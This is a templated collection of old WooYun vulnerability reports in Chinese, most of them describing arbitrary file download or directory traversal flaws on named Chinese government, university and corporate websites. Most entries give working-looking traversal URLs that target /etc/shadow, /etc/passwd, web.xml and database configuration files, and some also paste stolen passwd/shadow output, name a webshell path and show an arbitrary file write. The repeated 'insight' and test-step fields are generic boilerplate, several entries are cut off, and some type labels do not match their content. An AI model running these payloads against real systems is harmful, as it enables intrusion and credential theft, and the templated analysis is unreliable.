### [wooyun-2014-084553] 华中师范大学武汉传媒学院存在目录遍历且发现被入侵证据
**厂商**: 华中师范大学 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 存在webshell目录http://jpkc.whmc.edu.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/users/system/webshell地址http://jpkc.whmc.edu.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/users/system/JspSpy.jsp密码不知道

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085772] 中石化某业务存在任意文件下载漏洞
**厂商**: 中石化 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ppt.edri.sinopec.com:80/CN/item/downloadFile.jsp?filedisplay=../../WEB-INF/web.xml

**POC**: curl http://ppt.edri.sinopec.com/CN/item/downloadFile.jsp?filedisplay=../../WEB-INF/web.xml|more% Total    % Received % Xferd  Average Speed   Time    Time     Time  CurrentDload  Upload   Total   Spent    Left  Speed100  1215    0  1215    0     0  20881      0 --:--:-- --:--:-- --:--:-- 23823<U+FE

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0123149] 吉祥人寿保险任意文件下载
**厂商**: 吉祥人寿保险股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.jxlife.com.cn/online/shs/csinquiry/DocumentQuery/search/download.jsp?fileName=968_1388365801357.pdf&filePath=L2FwcC9XZWJTcGhlcmUvc2hhcmUvbWlzL3VwbG9hZA==看到这个加密，直接先拿去base64解密。解密结果:/app/WebSphere/share/mis/upload额...知道怎么办了，试试把密码文件路径base64加密Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n构造新URLwww.jxlife.com.cn/online/shs/csinquiry/DocumentQuery/search/download.jsp?filePath=Li4vLi4vLi

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这种小意思相信你们会的。。本来想去下载数据库配置文件的。。后天就考试了，还是算了把。。不玩了。
---

---
### [wooyun-2014-084098] 中国电信某大客户服务平台目录遍历漏洞
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站地址：http://61.160.137.144/index.shtml问题URL：http://61.160.137.144:80/sys/reviewImage.shtml?name=../../../../../../../../../../etc/shadowat:*:16135:0:99999:7:::bin:*:14749::::::daemon:*:14749::::::ftp:*:14749::::::games:*:14749::::::gdm:*:16135:0:99999:7:::haldaemon:*:14749:0::7:::lp:*:14749::::::mail:*:14749::::::man:*:14749::::::messagebus:*:14749:0::7:::news:*:14749::::::nobody:*:14749::::::ntp:

**POC**: 如上

**绕过**: 直接利用

**修复**: 权限控制
---

---
### [wooyun-2015-0105884] 智慧交大校园服务平台 任意文件下载
**厂商**: 华东交通大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个新建成的校园信息集成平台，可下载敏感配置文件在网盘下载链接审查元素发现http://portal.ecjtu.edu.cn/dcp/fileUpload?action=filedownload&fileName=black.png&filePath=uploadfiles/storage/2015/4/2/6f6f70cff21a4e5cbb7168d9da9bdad3.png其中filePath参数包含文件路径将地址改成，发现打开不是图片的格式http://portal.ecjtu.edu.cn/dcp/uploadfiles/storage/2015/4/2/6f6f70cff21a4e5cbb7168d9da9bdad3.png由此判断filedownload起到一个下载指定目录文件功能于是http://portal.ecjtu.edu.cn/dcp/fileUpload?act

**POC**: 密码文件：http://portal.ecjtu.edu.cn/dcp/fileUpload?action=filedownload&fileName=passwd&filePath=../../../../../../../../../../../../../../../../../../etc/shadow

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020007] 多家单位深信服设备敏感文件下载(补丁不及时),可成功控制设备 (2)
**厂商**: 多家政府相关单位 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖北省信访局https://xinfang.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf陕西省水利厅https://sxmwr.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf陕西省体育局https://sxty.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf河北省住房与城乡建设厅https://hb-cec.com/tmp/updateme/sinfor/ad/sys/sys_user.conf石家庄市委宣传部https://sjzxc.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf河南省教育厅https://haedu.gov.cn/tmp/updateme/sinfor/ad/sys/sys_u

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 火速打补丁！
---

---
### [wooyun-2012-05774] 国家电网源码泄露
**厂商**: 国家电网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个是群里人发的，不知道怎么利用...http://210.77.176.122/ssl/download.php?path=aW1hZ2VzL2RsanluYi8yMDExLzAyLzEwL0VERTVDNDQzNzA2RTczRjhCOEE1MUIyOEQ4MUJBRjQ5LnBkZg==base64加密 构造下路径加密OK！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过虑./ ../ 后辍等
---

---
### [wooyun-2014-071925] 晋江市新型农村合作医疗遍历目录且存在后门（可拿服务器）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 降权
---

---
### [wooyun-2014-055682] 优酷网API接口设计不当可以跳过收费功能限制+某论坛目录遍历
**厂商**: 优酷 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 优酷网API接口设计不当可以跳过收费功能限制，可以跳过广告直接观看视频首先，看一下开发者社区http://open.youku.com/docs/api_videos.html#videos-show-basicjson示例文件下面我们的看看json示例中的漏洞实例演示有广告地址http://v.youku.com/v_show/id_XNjk0NzIwOTAw.html?f=22126172&ev=2无广告地址http://player.youku.com/player.php/sid/XNjk0NzIwOTAw/v.swf把id_XNjk0NzIwOTAw.html中的视频标识id改为sid后的目录里即可下面是一个论坛的目录遍历漏洞，

**POC**: 漏洞证明弄了一个高端大气上档次的名字，希望乌云大哥给俺走个大厂商

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092437] 某市政务服务中心任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 泄露点http://www.szzwfw.gov.cn/xzsp/servlet/openFile?filename=ff8080813abfc49d013b639dd77b015f.doc&filepath=biaogefiles&showname=%C8%EB%BA%D3%C5%C5%CE%DB%BF%DA%C9%E8%D6%C3%C9%EA%C7%EB%CA%E9.doc判断操作系统可下载root密码http://www.szzwfw.gov.cn/xzsp/servlet/openFile?filename=shadow&filepath=../../../../../../etc可下载jsp源码http://www.szzwfw.gov.cn/xzsp/servlet/openFile?filename=jsp/web_sxcz/index_list_jc.jsp&filepat

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 文件下载过过滤../和限制下载文件类型
---

---
### [wooyun-2016-0212111] 广州医科大学某站点任意文件下载（信息泄露）
**厂商**: gzhmu.edu.cn | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://cwc.gzhmu.edu.cn 广州医科大学财务处问题出在8019端口上，漏洞地址：http://cwc.gzhmu.edu.cn:8019/cms/login.jsp ，这个系统经常用信息泄露：http://cwc.gzhmu.edu.cn:8019/cms/system/selectUsers.jsp任意文件下载：http://cwc.gzhmu.edu.cn:8019/cms/web/downloadFiles.jsp?file=/etc/shadow

**POC**: 漏洞地址：http://cwc.gzhmu.edu.cn:8019/cms/login.jsp信息泄露：http://cwc.gzhmu.edu.cn:8019/cms/system/selectUsers.jsp任意文件下载：http://cwc.gzhmu.edu.cn:8019/cms/web/downloadFiles.jsp?file=/etc/shadow

**绕过**: 直接利用

**修复**: 升级，放到内网。
---

---
### [wooyun-2015-0102546] 国金证券某漏洞导致任意文件下载
**厂商**: 国金证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近研究国金证券刚好研究到其邮件系统http://mail.gjqh.com.cn/owa/auth/logon.aspx?replaceCurrent=1&url=http%3a%2f%2fmail.gjqh.com.cn%2fowa%2f尝试了下常用端口，发现该服务器还开启了9090端口于是访问跳转到一个登陆界面http://mail.gjqh.com.cn:9090/login.jsp于是就有了任意文件下载http://mail.gjqh.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/passwdhttp://mail.gjqh.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/shadow权限很大的！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2014-087429] 某省就业网任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 辽宁省就业网http://www.jyw.gov.cn/web/download.file?file_name=/WEB-INF/web.xmlhttp://www.jyw.gov.cn/web/download.file?file_name=../web/pages/browse/2_index.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制下载
---

---
### [wooyun-2015-0122784] 移动公司某系统存在任意文件下载漏洞
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件可获取源代码和敏感文件http://kd.gdmmyd.net/ 资料下载功能处

**POC**: http://kd.gdmmyd.net/downloadfile?jessid=DC23B59499B730BECC0252B16C98E97F&type=attach&filename=../../WEB-INF/classes/jdbc.properties

**绕过**: 直接利用

**修复**: 参数过滤，禁止跨父目录
---

---
### [wooyun-2015-0124287] 山东大学(威海)某学院任意文件下载
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.ie.wh.sdu.edu.cn/download.jsp?filename=../download.jsp&realname=download.jspwww.ie.wh.sdu.edu.cn/download.jsp?filename=../WEB-INF/web.xml&realname=web.xmlwww.ie.wh.sdu.edu.cn/download.jsp?filename=../../../../../../../../../../../../../../root/.bash_history&realname=bash_historywww.ie.wh.sdu.edu.cn/download.jsp?filename=../../../../../../../../../../../../../../etc/passwd&realname=passwdwww.ie

**POC**: 读passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0110276] 天弘基金某处XXE漏洞任意文件读取
**厂商**: 天弘基金管理有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010945] 上海市徐汇区住房保障和房屋管理局任意文件下载
**厂商**: 上海市徐汇区住房保障和房屋管理局 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载权限大到可以下载影子文件

**POC**: 下载系统文件<%String realPath = request.getSession().getServletContext().getRealPath("/");String fileUrl = new String(request.getParameter("file").getBytes("ISO-8859-1"),"gbk");File file = new File(fileUrl);FileInputStream bis = new FileInputStream(realPath + "/xml/information/" + file);String name = file

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-068189] 全国注册会计师考试网任意文件下载
**厂商**: cpaexam.cicpa.org.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载：http://cpaexam.cicpa.org.cn/ArticleMngAction.do?filePath=/../../../etc/passwd%00.jpg&method=downFile/etc/passwd:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/

**POC**: /etc/passwd:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmai

**绕过**: 直接利用

**修复**: ......
---

---
### [wooyun-2014-067404] D-Link两款配置文件直接下载可获取路由帐号密码等信息
**厂商**: D-Link | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 型号：DIR-615和DIR-825配置文件下载地址：http://地址:8080/save_configuration.cgi

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加权限
---

---
### [wooyun-2014-054146] 揭阳市人民政府门户网站 任意文件下载
**厂商**: 揭阳市人民政府门户网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.jieyang.gov.cn/Worker.ashx?action=getatt&fp=../../view.aspx发现网上有其他非政府网站存在此文件漏洞，但由于数量少，就不走通用了

**POC**: www.jieyang.gov.cn/Worker.ashx?action=getatt&fp=../../view.aspx

**绕过**: 直接利用

**修复**: 禁止目录跨越
---

---
### [wooyun-2013-028467] 大唐某公司任意文件下载漏洞
**厂商**: 大唐贵州发电有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改链接 http://www.cdt-gz.com//accessoriesAction.ndo?action=download&itemId=594B890B-8C27-C0C2-9397-3666DC541BD0&filePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/594B890B-8C27-C0C2-9397-3666DC541BD01346922637747.pdf&fileName=%BC%AF%CD%C5%B9%AB%CB%BE%C6%F3%D2%B5%CE%C4%BB%AF%CA%D3%C6%B5%BD%B2%D7%F9%BF%CE%BC%FE.pdf 中参数 filepath 为要下载的文件即可。测试URL ：http://www.cdt-gz.com//accessoriesAction.ndo?

**POC**: 访问测试 url 提示文件下载下载的文件及访问 index.jsp 时的比对

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0138622] 中国电信旗下中英海底系统有限公司数据库泄漏
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官方网站：http://**.**.**.**/cn/about/default.aspx目录遍历：**.**.**.**/下载，解压缩rar文件：about                  Aritcle        cn        Default.aspx      flash      member       service          xmlanimated_favicon1.gif  ascx           contact   Default.aspx.cs   image      news         upload           黑白首页App_Code               aspnet_client  Controls  Default-CCS.aspx  images     _notes       Web_Admin      

**POC**: ls Data 有数据库备份2010haididianlan_Data.MDF  2010haididianlan_Log.LDFcat Web.config 数据库配置信息：<?xml version="1.0"?><configuration><configSections><section name="RewriterConfig" type="URLRewriter.Config.RewriterConfigSerializerSectionHandler, URLRewriter" /></configSections><appSettings><add key="FCKeditor

**绕过**: 直接利用

**修复**: 删除备份文件。
---

---
### [wooyun-2013-021785] 南昌市交管局任意文件下载漏洞
**厂商**: 南昌市公安局交管局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、正常下载文件链接地址：http://ncjj.nc.gov.cn/wwht/extfiledown?wjlj=1346057307119.doc&path=file2、尝试判断是否存在漏洞：参数wjlj=1346057307119.doc改为wjlj=aa/../1346057307119.doc仍然可正常下载，存在漏洞几率很大。3、网站对应真实物理路径：http://ncjj.nc.gov.cn/wwht/userfiles/file/1346057307119.doc

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤../../
---

---
### [wooyun-2013-045970] 金蝶网某站目录遍历可泄漏敏感信息
**厂商**: 金蝶 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://kdeas.kingdee.com/easWebClient/logs/存在目录遍历貌似以前有人爆过但是只对上级目录做了限制目录下子目录还有文件都没有限制

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做下限制
---

---
### [wooyun-2012-07403] 河北财政信息网任意文件下载
**厂商**: 河北省财政厅 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.hebcz.cn/cyportal1.3/downloadtag.jsp?fileName=2012%20%C5%A9%B7%A2%B4%F3%D7%A8%CF%EE%D4%A4%CB%E3%B0%B2%C5%C5%B1%ED.xls&filePath=site/site00/1290475676502/1290475834305/402881482c34fabe012c765a8bbf2076_attachment/402881483536d99d0135c7a7d97b492e/1.xls其中文件下载路径参数filepath没有对路径进行必要的限制！

**POC**: http://www.hebcz.cn/cyportal1.3/downloadtag.jsp?fileName=2012%20%C5%A9%B7%A2%B4%F3%D7%A8%CF%EE%D4%A4%CB%E3%B0%B2%C5%C5%B1%ED.xls&filePath=template/site00_index.jsphttp://www.hebcz.cn/cyportal1.3/downloadtag.jsp?fileName=2012%20%C5%A9%B7%A2%B4%F3%D7%A8%CF%EE%D4%A4%CB%E3%B0%B2%C5%C5%B1%ED.xls&filePath

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2013-037274] 某市人力资源和社会保障网任意文件下载
**厂商**: 某市人力资源和社会保障网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://www.hzsrsj.gov.cn/lemis/netweb/detail/download.jsp?url=/&filename=WEB-INF/web.xml配置文件下载：站点下某后台登陆页面地址及源码http://www.hzsrsj.gov.cn/lemis/LogonDialog.jsp

**POC**: 站点下某后台登陆页面地址及源码http://www.hzsrsj.gov.cn/lemis/LogonDialog.jsp

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2014-066311] 某门户网站系统存在两处任意文件下载漏洞
**厂商**: 上海释锐教育软件有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看样式对比，应该是官网这个产品：http://www.threeoa.com/product/501.html案例应该还是不少的！第一处下载：http://www.jmsyz.net/eeoaftp/downloadFile.action?path=WEB-INF/web.xmlhttp://jdyz.ijd.cn/eeoaftp/downloadFile.action?path=WEB-INF/web.xmlhttp://www.wxxqml.com/eeoaftp/downloadFile.action?path=WEB-INF/web.xmlhttp://www.sxxazx.com:2012/eeoaftp/downloadFile.action?path=WEB-INF/web.xml

**POC**: 第二处下载：http://www.jmsyz.net/findPortalNewsBycategoryIdAndTopPortalNewsAction.action?bg=background6&categoryId=jms-11&displayMode=wordList&from=index&num=8&picHight=&picWidth=&proportionVal=1&showDate=0&showMore=0&showTitle=0&siteId=../WEB-INF/web.xml%3f&wordSize=替换为上面第一处的几个域名都是OK的。

**绕过**: 直接利用

**修复**: 限制路径
---

---
### [wooyun-2011-01776] 21cn遍历目录
**厂商**: 中关村在线 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历目录

**POC**: http://v.zol.com.cn/admin/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070209] 西安交通大学某移动APP存在任意文件下载
**厂商**: 西安交通大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有缘：http://www.huaue.com/gzxx2014/2014711110557.htm前些天看到这么个新闻，然后就好奇下了个来玩玩。不下不知道啊，还不只是一个APP，是一大群APP啊下载几个玩玩，发现其中的交大OA启动时会下载配置文件，修改文件目录，发现可以任意下载。URLhttp://moa.xjtu.edu.cn:9083//file/oa@xajt.zip/?filePath=../../etc/passwd

**POC**: /etc/shadow文件：

**绕过**: 直接利用

**修复**: 给路径作个过滤吧
---

---
### [wooyun-2012-06366] 美特斯邦威官方商城目录遍历
**厂商**: banggo.com | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美特斯邦威官方商城某站点目录遍历,泄露部分表结构。

**POC**: http://img.banggo.com/image_manage.php?act=into&path=../&cat=banggo虽然主站和img这个站不是同服，但还是存放有主站的旧的源代码。一些表结构的信息http://www.banggo.com/sql/chenqiang-sql.txthttp://www.banggo.com/sql/shiling-sql.txt

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-050551] 广东省教育厅网站存在目录遍历敏感信息泄露
**厂商**: 广东省教育厅 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 广东省教育厅网站存在目录遍历漏洞，可下载文件，导致敏感信息泄露。http://www.edugd.cn/web/文件下载敏感信息泄露

**POC**: 广东省教育厅网站存在目录遍历漏洞，可下载文件，导致敏感信息泄露。http://www.edugd.cn/web/文件下载敏感信息泄露

**绕过**: 直接利用

**修复**: 配置不当，你懂的。
---

---
### [wooyun-2015-0130898] 金智教育epstar系统任意文件写入、任意文件读取[影响众多高校]
**厂商**: 金智教育 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 说实在哟，还真不清楚这到底什么系统，看到每个都是目录epstar应该叫epstar系统，有的学校用它做学生信息系统管理、有的学校用它用宿舍信息管理、有的学校用它做科研管理、有的学校用它做研究生系统管理。某日晚上，在测试漏洞的时候，发现后台抓包居然发现了这么严重的问题。问题出在：/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml就是这么简单发现了居然可以读取任意文件：看看南开大学的：http://**.**.**.**/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml挖了一下案例，居然是通用： （很多名校没有统计全标题，还有很多案例）http://**.**.**.**/epstar/servlet/RaqFile

**POC**: 更奇葩的在这里，任意文件写入漏洞，当action操作为sava时可以写任意文件进去~以同济大学开刀测试。http://**.**.**.**/epstar/servlet/RaqFileServer?action=save&fileName=../wooyun.php果然就是直接写进去了

**绕过**: 直接利用

**修复**: 修复吧，要打马赛克请联系乌云管理员哟~
---

---
### [wooyun-2014-089087] 风行网分站任意文件下载config泄露敏感信息
**厂商**: 北京风行在线技术有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 风行网分站任意文件下载，config泄露敏感信息站点:http://s1.zqjlsj.funshion.com/下载文件http://s1.zqjlsj.funshion.com//include/common.inc.phphttp://s1.zqjlsj.funshion.com///config.inc.phphttp://s1.zqjlsj.funshion.com///include/global.func.phphttp://s1.zqjlsj.funshion.com///include/security.inc.php

**POC**: 风行网分站任意文件下载，config泄露敏感信息站点:http://s1.zqjlsj.funshion.com/下载文件http://s1.zqjlsj.funshion.com//include/common.inc.phphttp://s1.zqjlsj.funshion.com///config.inc.phphttp://s1.zqjlsj.funshion.com///include/global.func.phphttp://s1.zqjlsj.funshion.com///include/security.inc.php

**绕过**: 直接利用

**修复**: 危险自知禁止下载做下权限吧
---

---
### [wooyun-2015-0120328] 吉祥人寿某系统存在任意文件下载漏洞
**厂商**: 吉祥人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题链接如下http://sales.jxlife.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/passwdhttp://sales.jxlife.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../etc/hosts

**POC**: http://ucstar.jxlife.com.cn:9090/uploadfile?istrade=istrade&filename=../../../../../home/webcall/.bash_history

